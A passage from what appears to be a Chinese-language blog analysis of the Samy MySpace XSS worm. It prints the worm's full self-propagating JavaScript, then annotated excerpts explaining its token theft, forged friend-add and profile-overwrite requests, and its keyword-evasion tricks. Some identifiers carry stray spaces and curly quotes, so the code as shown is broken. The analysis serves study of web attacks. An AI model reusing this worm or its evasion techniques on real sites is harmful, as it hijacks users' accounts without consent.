class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=mycode style=”BACKGROUND: url(<span class="string">'javascript:eval(document.all.mycode.expr)'</span>)” expr=”</span><br><span class="line"><span class="keyword">var</span> B = <span class="built_in">String</span>.fromCharCode(<span class="number">34</span>);</span><br><span class="line"><span class="keyword">var</span> A = <span class="built_in">String</span>.fromCharCode(<span class="number">39</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">g</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> C;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> D = <span class="built_in">document</span>.body.createTextRange(); C = D.htmlText</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">    <span class="keyword">if</span> (C) &#123;</span><br><span class="line">        <span class="keyword">return</span> C</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">eval</span>(<span class="string">'document.body.innerHTML'</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFromURL</span>(<span class="params">BF, BG</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> T;</span><br><span class="line">    <span class="keyword">if</span> (BG == <span class="string">'Mytoken'</span>) &#123;</span><br><span class="line">        T = B</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        T = <span class="string">' &amp; '</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> U = BG + <span class="string">' = '</span>;</span><br><span class="line">    <span class="keyword">var</span> V = BF.indexOf(U) + U.length;</span><br><span class="line">    <span class="keyword">var</span> W = BF.substring(V, V + <span class="number">1024</span>);</span><br><span class="line">    <span class="keyword">var</span> X = W.indexOf(T);</span><br><span class="line">    <span class="keyword">var</span> Y = W.substring(<span class="number">0</span>, X);</span><br><span class="line">    <span class="keyword">return</span> Y</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getData</span>(<span class="params">AU</span>) </span>&#123;</span><br><span class="line">    M = getFromURL(AU, <span class="string">'friendID'</span>);</span><br><span class="line">    L = getFromURL(AU, <span class="string">'Mytoken'</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getQueryParams</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> E = <span class="built_in">document</span>.location.search;</span><br><span class="line">    <span class="keyword">var</span> F = E.substring(<span class="number">1</span>, E.length).split(<span class="string">' &amp; '</span>);</span><br><span class="line">    <span class="keyword">var</span> AS = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> O = <span class="number">0</span>; O &lt; F.length; O++) &#123;</span><br><span class="line">        <span class="keyword">var</span> I = F[O].split(<span class="string">' = '</span>);</span><br><span class="line">        AS[I[<span class="number">0</span>]] = I[<span class="number">1</span>]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> AS</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> J;</span><br><span class="line"><span class="keyword">var</span> AS = getQueryParams();</span><br><span class="line"><span class="keyword">var</span> L = AS[<span class="string">'Mytoken'</span>];</span><br><span class="line"><span class="keyword">var</span> M = AS[<span class="string">'friendID'</span>];</span><br><span class="line"><span class="keyword">if</span> (location.hostname == <span class="string">'profile.myspace.com'</span>) &#123;</span><br><span class="line">    <span class="built_in">document</span>.location</span><br><span class="line">        = <span class="string">'http: //www.myspace.com'</span> + location.pathname + location.search</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!M) &#123;</span><br><span class="line">        getData(g())</span><br><span class="line">    &#125;</span><br><span class="line">    main()</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getClientFID</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> findIn(g(), <span class="string">'up_launchIC('</span> + A, A)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">nothing</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">paramsToString</span>(<span class="params">AV</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> N = <span class="keyword">new</span> <span class="built_in">String</span>();</span><br><span class="line">    <span class="keyword">var</span> O = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> P <span class="keyword">in</span> AV) &#123;</span><br><span class="line">        <span class="keyword">if</span> (O &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            N += <span class="string">' &amp; '</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> Q = <span class="built_in">escape</span>(AV[P]);</span><br><span class="line">        <span class="keyword">while</span> (Q.indexOf(<span class="string">' + '</span>) != <span class="number">-1</span>) &#123;</span><br><span class="line">            Q = Q.replace(<span class="string">' + '</span>, <span class="string">' % 2B'</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (Q.indexOf(<span class="string">' &amp; '</span>) != <span class="number">-1</span>) &#123;</span><br><span class="line">            Q = Q.replace(<span class="string">' &amp; '</span>, <span class="string">' % 26'</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        N += P + <span class="string">' = '</span> + Q; O++</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> N</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">httpSend</span>(<span class="params">BH, BI, BJ, BK</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!J) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">eval</span>(<span class="string">'J.onr'</span> + <span class="string">'eadystatechange = BI'</span>);</span><br><span class="line">    J.open(BJ, BH, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (BJ == <span class="string">'POST'</span>) &#123;</span><br><span class="line">        J.setRequestHeader(<span class="string">'Content - Type'</span>, <span class="string">'application / x - www - form - urlencoded'</span>);</span><br><span class="line">        J.setRequestHeader(<span class="string">'Content - Length'</span>, BK.length)</span><br><span class="line">    &#125;</span><br><span class="line">    J.send(BK); <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">findIn</span>(<span class="params">BF, BB, BC</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> R = BF.indexOf(BB) + BB.length;</span><br><span class="line">    <span class="keyword">var</span> S = BF.substring(R, R + <span class="number">1024</span>);</span><br><span class="line">    <span class="keyword">return</span> S.substring(<span class="number">0</span>, S.indexOf(BC))</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getHiddenParameter</span>(<span class="params">BF, BG</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> findIn(BF, <span class="string">'name = '</span> + B + BG + B + <span class="string">'value = '</span> + B, B)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getXMLObj</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> Z = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">window</span>.XMLHttpRequest) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Z = <span class="keyword">new</span> XMLHttpRe - quest()</span><br><span class="line">        &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">            Z = <span class="literal">false</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">window</span>.ActiveXObject) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Z = <span class="keyword">new</span> ActiveXOb - ject(<span class="string">'Msxml2.XMLHTTP'</span>)</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Z = <span class="keyword">new</span> ActiveXOb - ject(<span class="string">'Microsoft.XMLHTTP'</span>)</span><br><span class="line">            &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                Z = <span class="literal">false</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> Z</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> AA = g();</span><br><span class="line"><span class="keyword">var</span> AB = AA.indexOf(<span class="string">'m'</span> + <span class="string">'ycode'</span>);</span><br><span class="line"><span class="keyword">var</span> AC = AA.substring(AB, AB + <span class="number">4096</span>);</span><br><span class="line"><span class="keyword">var</span> AD = AC.indexOf(<span class="string">'D'</span> + <span class="string">'IV'</span>);</span><br><span class="line"><span class="keyword">var</span> AE = AC.substring(<span class="number">0</span>, AD);</span><br><span class="line"><span class="keyword">var</span> AF;</span><br><span class="line"><span class="keyword">if</span> (AE) &#123;</span><br><span class="line">    AE = AE.replace(<span class="string">'jav'</span> + <span class="string">'a'</span>, A + <span class="string">'jav'</span> + <span class="string">'a'</span>);</span><br><span class="line">    AE = AE.replace(<span class="string">'exp'</span> + <span class="string">'r)'</span>, <span class="string">'exp'</span> + <span class="string">'r)'</span> + A);</span><br><span class="line">    AF = <span class="string">'but most of all,samy is my hero. &lt; d'</span> + <span class="string">'iv id = '</span> + AE + <span class="string">'D'</span> + <span class="string">'IV &gt; '</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> AG;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getHome</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (J.readyState != <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> AU = J.responseText;</span><br><span class="line">    AG = findIn(AU, <span class="string">'P'</span> + <span class="string">'rofileHeroes'</span>, <span class="string">' &lt; /td&gt;'</span>);</span><br><span class="line">    AG = AG.substring(<span class="number">61</span>, AG.length);</span><br><span class="line">    <span class="keyword">if</span> (AG.indexOf(<span class="string">'samy'</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (AF) &#123;</span><br><span class="line">            AG += AF;</span><br><span class="line">            <span class="keyword">var</span> AR = getFromURL(AU, <span class="string">'Mytoken'</span>);</span><br><span class="line">            <span class="keyword">var</span> AS = <span class="keyword">new</span> Ar - ray();</span><br><span class="line">            AS[<span class="string">'interestLabel'</span>] = <span class="string">'heroes'</span>;</span><br><span class="line">            AS[<span class="string">'submit'</span>] = <span class="string">'Preview'</span>;</span><br><span class="line">            AS[<span class="string">'interest'</span>] = AG;</span><br><span class="line">            J = getXMLObj();</span><br><span class="line">            httpSend(<span class="string">'/index.cfm ? fuseaction = profile.previewInterests &amp; Mytoken = '</span> + AR,</span><br><span class="line">                postHero, <span class="string">'POST'</span>, paramsToString(AS))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">postHero</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (J.readyState != <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> AU = J.responseText;</span><br><span class="line">    <span class="keyword">var</span> AR = getFromURL(AU, <span class="string">'Mytoken'</span>);</span><br><span class="line">    <span class="keyword">var</span> AS = <span class="keyword">new</span> Ar - ray();</span><br><span class="line">    AS[<span class="string">'interestLabel'</span>] = <span class="string">'heroes'</span>;</span><br><span class="line">    AS[<span class="string">'submit'</span>] = <span class="string">'Submit'</span>;</span><br><span class="line">    AS[<span class="string">'interest'</span>] = AG;</span><br><span class="line">    AS[<span class="string">'hash'</span>] = getHiddenParame - ter(AU, <span class="string">'hash'</span>);</span><br><span class="line">    httpSend(<span class="string">' / index.cfm ? fuseaction = profile.processInterests &amp; Mytoken = '</span> + AR,</span><br><span class="line">        nothing, <span class="string">'POST'</span>, paramsToString(AS))</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> AN = getClientFID();</span><br><span class="line">    <span class="keyword">var</span> BH = <span class="string">' / index.cfm ? fuseaction = user.viewProfile &amp; friendID = '</span> + AN + <span class="string">' &amp; Mytoken = '</span> + L;</span><br><span class="line">    J = getXMLObj();</span><br><span class="line">    httpSend(BH, getHome, <span class="string">'GET'</span>);</span><br><span class="line">    xmlhttp2 = getXMLObj();</span><br><span class="line">    httpSend2(<span class="string">' / index.cfm ? fuseaction = invite.addfriend_verify &amp; friendID = 11851658 &amp; Mytoken = '</span> + L,</span><br><span class="line">        processxForm, <span class="string">'GET'</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">processx</span> - <span class="title">Form</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (xmlhttp2.readyState != <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> AU = xmlhttp2.responseText;</span><br><span class="line">    <span class="keyword">var</span> AQ = getHiddenParameter(AU, <span class="string">'hashcode'</span>);</span><br><span class="line">    <span class="keyword">var</span> AR = getFromURL(AU, <span class="string">'Mytoken'</span>);</span><br><span class="line">    <span class="keyword">var</span> AS = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line">    AS[<span class="string">'hashcode'</span>] = AQ;</span><br><span class="line">    AS[<span class="string">'friendID'</span>] = <span class="string">'11851658'</span>;</span><br><span class="line">    AS[<span class="string">'submit'</span>] = <span class="string">'Add to Friends'</span>;</span><br><span class="line">    httpSend2(<span class="string">' / index.cfm ? fuseaction = invite.addFriendsProcess &amp; Mytoken = '</span> + AR,</span><br><span class="line">        nothing, <span class="string">'POST'</span>, paramsToString(AS))</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">httpSend2</span>(<span class="params">BH, BI, BJ, BK</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!xmlhttp2) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">eval</span>(<span class="string">'xmlhttp2.onr'</span> + <span class="string">'eadystatechange = BI'</span>);</span><br><span class="line">    xmlhttp2.open(BJ, BH, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (BJ == <span class="string">'POST'</span>) &#123;</span><br><span class="line">        xmlhttp2.setRequestHeader(<span class="string">'Content - Type'</span>, <span class="string">'application / x - www - form - urlencoded'</span>); xmlhttp2.setRequestHeader(<span class="string">'Content - Length'</span>, BK.length)</span><br><span class="line">    &#125;</span><br><span class="line">    xmlhttp2.send(BK); <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line">”&gt;<span class="xml"><span class="tag">&lt;/<span class="name">DIV</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>这里就是这个蠕虫的前导代码了</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> J;</span><br><span class="line"><span class="keyword">var</span> AS = getQueryParams();<span class="comment">// 这里是获取用户的信息栏</span></span><br><span class="line"><span class="keyword">var</span> L = AS[<span class="string">'Mytoken'</span>];</span><br><span class="line"><span class="keyword">var</span> M = AS[<span class="string">'friendID'</span>];</span><br><span class="line"><span class="keyword">if</span> (location.hostname == <span class="string">'profile.myspace.com'</span>) &#123;</span><br><span class="line">    <span class="built_in">document</span>.location</span><br><span class="line">        = <span class="string">'http: //www.myspace.com'</span> + location.pathname + location.search</span><br><span class="line">    <span class="comment">// 这里进行重定向到 www 站点从用户的属性页面</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 如果这里不是在用户的属性页面，是在浏览页面时候遇上的，就开始工作了！</span></span><br><span class="line">    <span class="keyword">if</span> (!M) &#123;</span><br><span class="line">        getData(g())<span class="comment">// g 返回页面特定内容</span></span><br><span class="line">    &#125;</span><br><span class="line">    main()<span class="comment">// ready to go</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p><code>getdata</code> 的函数内容很容易理解</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getData</span>(<span class="params">AU</span>) </span>&#123;</span><br><span class="line">    M = getFromURL(AU, <span class="string">'friendID'</span>);</span><br><span class="line">    L = getFromURL(AU, <span class="string">'Mytoken'</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里是 得到用户的属性页的列表：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getQueryParams</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> E = <span class="built_in">document</span>.location.search;</span><br><span class="line">    <span class="keyword">var</span> F = E.substring(<span class="number">1</span>, E.length).split(<span class="string">' &amp; '</span>);</span><br><span class="line">    <span class="keyword">var</span> AS = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> O = <span class="number">0</span>; O &lt; F.length; O++) &#123;</span><br><span class="line">        <span class="keyword">var</span> I = F[O].split(<span class="string">' = '</span>);</span><br><span class="line">        AS[I[<span class="number">0</span>]] = I[<span class="number">1</span>]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> AS</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从这个的标签可以看出，此处实际上没有进行XSS的过滤，所以可以直接提交一个 div 标签，就可以实现 XSS 代码的存储。</p><hr><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> AN = getClientFID();<span class="comment">// 取得uid</span></span><br><span class="line">    <span class="keyword">var</span> BH = <span class="string">' / index.cfm ? fuseaction = user.viewProfile &amp; friendID = '</span> + AN + <span class="string">' &amp; Mytoken = '</span> + L;</span><br><span class="line">    J = getXMLObj();<span class="comment">// 取得 http交互示例</span></span><br><span class="line">    httpSend(BH, getHome, <span class="string">'GET'</span>);<span class="comment">// 伪造浏览用户 profile 的动作 // 这里可能报异常</span></span><br><span class="line">    xmlhttp2 = getXMLObj();<span class="comment">// 这里得到一个 HTTP 交互的示例</span></span><br><span class="line">    httpSend2(<span class="string">' / index.cfm ? fuseaction = invite.addfriend_verify &amp; friendID = 11851658 &amp; Mytoken = '</span> + L,</span><br><span class="line">        processxForm, <span class="string">'GET'</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>在 <code>getXMLObj</code> 函数里面使用了比较hack 的写法，应该是避免了人一些针对关键字的检测，其具体的实现代码如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getXMLObj</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> Z = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">window</span>.XMLHttpRequest) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Z = <span class="keyword">new</span> XMLHttpRe - quest()<span class="comment">// 这里就是混淆</span></span><br><span class="line">        &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">            Z = <span class="literal">false</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">window</span>.ActiveXObject) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Z = <span class="keyword">new</span> ActiveXOb - ject(<span class="string">'Msxml2.XMLHTTP'</span>)<span class="comment">// 混淆</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (e) &#123; </span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Z = <span class="keyword">new</span> ActiveXOb - ject(<span class="string">'Microsoft.XMLHTTP'</span>)</span><br><span class="line">            &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                Z = <span class="literal">false</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> Z</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">httpSend</span>(<span class="params">BH, BI, BJ, BK</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!J) &#123;<span class="comment">// 这里的J是前面返回的 XHR 实例。</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">eval</span>(<span class="string">'J.onr'</span> + <span class="string">'eadystatechange = BI'</span>);<span class="comment">// 这里对核心操作进行混淆</span></span><br><span class="line">    J.open(BJ, BH, <span class="literal">true</span>);<span class="comment">// 这里打开一个 XHR 请求 （方式，链接）</span></span><br><span class="line">    <span class="keyword">if</span> (BJ == <span class="string">'POST'</span>) &#123;</span><br><span class="line">        J.setRequestHeader(<span class="string">'Content - Type'</span>, <span class="string">'application / x - www - form - urlencoded'</span>);</span><br><span class="line">        J.setRequestHeader(<span class="string">'Content - Length'</span>, BK.length)</span><br><span class="line">    &#125;</span><br><span class="line">    J.send(BK); <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里，使用了<strong>eval对其状态回调进行了赋值。</strong> 即在其完成后执行</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getHome</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (J.readyState != <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> AU = J.responseText;</span><br><span class="line">    AG = findIn(AU, <span class="string">'P'</span> + <span class="string">'rofileHeroes'</span>, <span class="string">' &lt; /td&gt;'</span>);</span><br><span class="line">    AG = AG.substring(<span class="number">61</span>, AG.length);</span><br><span class="line">    <span class="keyword">if</span> (AG.indexOf(<span class="string">'samy'</span>) == <span class="number">-1</span>) &#123;<span class="comment">// 这里判断当前用户是否是否关注了 samy</span></span><br><span class="line">        <span class="keyword">if</span> (AF) &#123;</span><br><span class="line">            AG += AF;</span><br><span class="line">            <span class="keyword">var</span> AR = getFromURL(AU, <span class="string">'Mytoken'</span>);</span><br><span class="line">            <span class="keyword">var</span> AS = <span class="keyword">new</span> Ar - ray();</span><br><span class="line">            AS[<span class="string">'interestLabel'</span>] = <span class="string">'heroes'</span>;</span><br><span class="line">            AS[<span class="string">'submit'</span>] = <span class="string">'Preview'</span>;</span><br><span class="line">            AS[<span class="string">'interest'</span>] = AG;</span><br><span class="line">            J = getXMLObj();</span><br><span class="line">            httpSend(<span class="string">'/index.cfm ? fuseaction = profile.previewInterests &amp; Mytoken = '</span> + AR, postHero, <span 